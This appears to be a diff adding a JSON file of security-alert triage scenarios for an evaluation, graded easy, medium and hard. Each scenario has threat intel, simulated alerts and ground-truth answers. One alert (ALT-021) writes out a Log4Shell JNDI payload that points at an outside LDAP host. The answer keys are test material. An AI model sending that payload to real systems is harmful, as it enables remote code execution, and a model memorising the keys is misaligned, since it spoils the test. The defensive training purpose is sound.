@@ -1,0 +1,360 @@
+{
+  "easy": [
+    {
+      "scenario_id": "easy_001",
+      "description": "Obvious port scan from known malicious IP",
+      "threat_intel": {
+        "known_bad_ips": ["185.220.101.47", "45.33.32.156"],
+        "known_bad_domains": ["evil-c2.ru", "malware-drop.cn"],
+        "active_campaigns": ["ShadowScan-2024"],
+        "organization_profile": "Mid-size e-commerce company, handles payment data",
+        "recent_cve_advisories": ["CVE-2023-44487"]
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-001",
+          "timestamp": "2024-03-15T02:13:45Z",
+          "source_ip": "185.220.101.47",
+          "destination": "internal-web-01:80",
+          "event_type": "port_scan",
+          "severity_raw": "high",
+          "geo_country": "RU",
+          "related_cves": [],
+          "payload_snippet": "SYN packets to ports 80,443,8080,22,3389 — 500 req/min",
+          "user_agent": null,
+          "frequency": 847,
+          "tags": ["recon", "automated"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-001": {
+          "classification": "true_positive",
+          "severity": "high",
+          "action": "block_ip",
+          "explanation": "IP is on known bad list, port scanning is reconnaissance, block immediately"
+        }
+      }
+    },
+    {
+      "scenario_id": "easy_002",
+      "description": "Internal employee accessing HR portal during work hours",
+      "threat_intel": {
+        "known_bad_ips": ["185.220.101.47"],
+        "known_bad_domains": [],
+        "active_campaigns": [],
+        "organization_profile": "Tech company, 500 employees",
+        "recent_cve_advisories": []
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-002",
+          "timestamp": "2024-03-15T10:22:11Z",
+          "source_ip": "10.0.1.45",
+          "destination": "hr-portal.internal:443",
+          "event_type": "web_access",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "GET /employee/payslips HTTP/1.1 200 OK",
+          "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "frequency": 3,
+          "tags": ["internal", "normal_hours"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-002": {
+          "classification": "false_positive",
+          "severity": "low",
+          "action": "dismiss",
+          "explanation": "Internal IP, normal business hours, legitimate HR portal access"
+        }
+      }
+    },
+    {
+      "scenario_id": "easy_003",
+      "description": "Known malware dropper domain DNS lookup",
+      "threat_intel": {
+        "known_bad_ips": [],
+        "known_bad_domains": ["malware-drop.cn", "evil-c2.ru"],
+        "active_campaigns": ["DropperCampaign-Q1"],
+        "organization_profile": "Financial institution",
+        "recent_cve_advisories": []
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-003",
+          "timestamp": "2024-03-15T14:05:33Z",
+          "source_ip": "10.0.5.22",
+          "destination": "8.8.8.8:53",
+          "event_type": "dns_lookup",
+          "severity_raw": "critical",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "Query: malware-drop.cn A record",
+          "user_agent": null,
+          "frequency": 1,
+          "tags": ["dns", "threat-intel-match"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-003": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "isolate_host",
+          "explanation": "Internal host querying known malware domain — likely infected, isolate immediately"
+        }
+      }
+    }
+  ],
+
+  "medium": [
+    {
+      "scenario_id": "medium_001",
+      "description": "Multi-alert correlated attack — brute force followed by successful login from new geo",
+      "threat_intel": {
+        "known_bad_ips": ["203.0.113.99"],
+        "known_bad_domains": [],
+        "active_campaigns": ["CredentialStuffing-Wave3"],
+        "organization_profile": "SaaS company, 10k users, stores OAuth tokens",
+        "recent_cve_advisories": ["CVE-2024-1234"]
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-010",
+          "timestamp": "2024-03-15T23:01:00Z",
+          "source_ip": "203.0.113.99",
+          "destination": "auth-service:443",
+          "event_type": "brute_force",
+          "severity_raw": "high",
+          "geo_country": "CN",
+          "related_cves": [],
+          "payload_snippet": "POST /api/login — 200 failures in 5 min for user admin@company.com",
+          "user_agent": "python-requests/2.28",
+          "frequency": 200,
+          "tags": ["brute_force", "credential_stuffing"]
+        },
+        {
+          "alert_id": "ALT-011",
+          "timestamp": "2024-03-15T23:08:45Z",
+          "source_ip": "203.0.113.99",
+          "destination": "auth-service:443",
+          "event_type": "successful_login",
+          "severity_raw": "medium",
+          "geo_country": "CN",
+          "related_cves": [],
+          "payload_snippet": "POST /api/login — 200 OK, session token issued for admin@company.com",
+          "user_agent": "python-requests/2.28",
+          "frequency": 1,
+          "tags": ["login_success", "geo_anomaly"]
+        },
+        {
+          "alert_id": "ALT-012",
+          "timestamp": "2024-03-15T23:09:10Z",
+          "source_ip": "203.0.113.99",
+          "destination": "admin-panel:443",
+          "event_type": "privilege_access",
+          "severity_raw": "high",
+          "geo_country": "CN",
+          "related_cves": [],
+          "payload_snippet": "GET /admin/users/export — 200 OK, 10,000 user records downloaded",
+          "user_agent": "python-requests/2.28",
+          "frequency": 1,
+          "tags": ["data_exfil", "admin_access"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-010": {
+          "classification": "true_positive",
+          "severity": "high",
+          "action": "block_ip",
+          "explanation": "Brute force from known bad IP, block immediately"
+        },
+        "ALT-011": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "escalate_to_ir",
+          "explanation": "Successful login after brute force = account compromise, escalate to IR"
+        },
+        "ALT-012": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "isolate_host",
+          "explanation": "Active data exfiltration in progress — isolate and escalate"
+        }
+      }
+    },
+    {
+      "scenario_id": "medium_002",
+      "description": "Noisy vulnerability scanner vs real exploitation attempt — agent must distinguish",
+      "threat_intel": {
+        "known_bad_ips": [],
+        "known_bad_domains": [],
+        "active_campaigns": [],
+        "organization_profile": "Enterprise tech company, runs regular pentests",
+        "recent_cve_advisories": ["CVE-2023-44487", "CVE-2021-44228"]
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-020",
+          "timestamp": "2024-03-16T09:00:00Z",
+          "source_ip": "192.168.10.50",
+          "destination": "prod-web:443",
+          "event_type": "vulnerability_scan",
+          "severity_raw": "medium",
+          "geo_country": "US",
+          "related_cves": ["CVE-2021-44228"],
+          "payload_snippet": "Nessus scan signature detected — scheduled pentest window",
+          "user_agent": "Nessus/10.5",
+          "frequency": 500,
+          "tags": ["pentest", "scheduled", "internal"]
+        },
+        {
+          "alert_id": "ALT-021",
+          "timestamp": "2024-03-16T09:45:22Z",
+          "source_ip": "198.51.100.77",
+          "destination": "prod-web:443",
+          "event_type": "log4shell_attempt",
+          "severity_raw": "critical",
+          "geo_country": "IR",
+          "related_cves": ["CVE-2021-44228"],
+          "payload_snippet": "${jndi:ldap://198.51.100.77:1389/Exploit} in User-Agent header",
+          "user_agent": "${jndi:ldap://198.51.100.77:1389/Exploit}",
+          "frequency": 12,
+          "tags": ["log4shell", "rce_attempt", "external"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-020": {
+          "classification": "false_positive",
+          "severity": "low",
+          "action": "dismiss",
+          "explanation": "Authorized pentest scanner from internal IP during scheduled window"
+        },
+        "ALT-021": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "escalate_to_ir",
+          "explanation": "Real Log4Shell exploitation attempt from external IP — critical RCE risk"
+        }
+      }
+    }
+  ],
+
+  "hard": [
+    {
+      "scenario_id": "hard_001",
+      "description": "APT — Living-off-the-land attack, low-and-slow, mimics legitimate admin behavior",
+      "threat_intel": {
+        "known_bad_ips": [],
+        "known_bad_domains": [],
+        "active_campaigns": ["APT29-Cozy-Bear-Variant"],
+        "organization_profile": "Defense contractor, handles classified project metadata, 200 employees",
+        "recent_cve_advisories": ["CVE-2024-3400"]
+      },
+      "alerts": [
+        {
+          "alert_id": "ALT-100",
+          "timestamp": "2024-03-10T08:22:00Z",
+          "source_ip": "10.0.2.15",
+          "destination": "dc01.corp.internal:389",
+          "event_type": "ldap_query",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "LDAP: (objectClass=user) — enumerate all domain users",
+          "user_agent": null,
+          "frequency": 1,
+          "tags": ["ldap", "internal", "admin_tool"]
+        },
+        {
+          "alert_id": "ALT-101",
+          "timestamp": "2024-03-11T11:05:14Z",
+          "source_ip": "10.0.2.15",
+          "destination": "file-server-02:445",
+          "event_type": "smb_access",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "SMB: read access to \\\\file-server-02\\projects\\classified\\",
+          "user_agent": null,
+          "frequency": 3,
+          "tags": ["smb", "file_access", "internal"]
+        },
+        {
+          "alert_id": "ALT-102",
+          "timestamp": "2024-03-12T02:14:50Z",
+          "source_ip": "10.0.2.15",
+          "destination": "185.199.108.153:443",
+          "event_type": "outbound_connection",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "HTTPS connection to github.com — 2.3MB upload over 20 min",
+          "user_agent": "git/2.39.0",
+          "frequency": 1,
+          "tags": ["outbound", "https", "off_hours"]
+        },
+        {
+          "alert_id": "ALT-103",
+          "timestamp": "2024-03-13T02:18:00Z",
+          "source_ip": "10.0.2.15",
+          "destination": "185.199.108.153:443",
+          "event_type": "outbound_connection",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "HTTPS connection to github.com — 5.1MB upload over 35 min",
+          "user_agent": "git/2.39.0",
+          "frequency": 1,
+          "tags": ["outbound", "https", "off_hours", "repeated"]
+        },
+        {
+          "alert_id": "ALT-104",
+          "timestamp": "2024-03-14T02:21:33Z",
+          "source_ip": "10.0.2.15",
+          "destination": "185.199.108.153:443",
+          "event_type": "outbound_connection",
+          "severity_raw": "low",
+          "geo_country": "US",
+          "related_cves": [],
+          "payload_snippet": "HTTPS connection to github.com — 8.7MB upload over 45 min",
+          "user_agent": "git/2.39.0",
+          "frequency": 1,
+          "tags": ["outbound", "https", "off_hours", "repeated", "increasing_volume"]
+        }
+      ],
+      "ground_truth": {
+        "ALT-100": {
+          "classification": "true_positive",
+          "severity": "medium",
+          "action": "monitor",
+          "explanation": "LDAP enumeration by internal host is suspicious — could be lateral movement recon, monitor"
+        },
+        "ALT-101": {
+          "classification": "true_positive",
+          "severity": "high",
+          "action": "monitor",
+          "explanation": "Unusual SMB access to classified project files combined with prior LDAP recon — escalating pattern"
+        },
+        "ALT-102": {
+          "classification": "true_positive",
+          "severity": "high",
+          "action": "monitor",
+          "explanation": "Late-night large upload to github from same host doing recon — likely exfil staging, monitor"
+        },
+        "ALT-103": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "escalate_to_ir",
+          "explanation": "Repeated nightly uploads increasing in size — classic APT low-and-slow exfiltration pattern"
+        },
+        "ALT-104": {
+          "classification": "true_positive",
+          "severity": "critical",
+          "action": "isolate_host",
+          "explanation": "Confirmed exfil pattern — isolate host immediately, preserve forensics, escalate to IR"
+        }
+      }
+    }
+  ]
+}
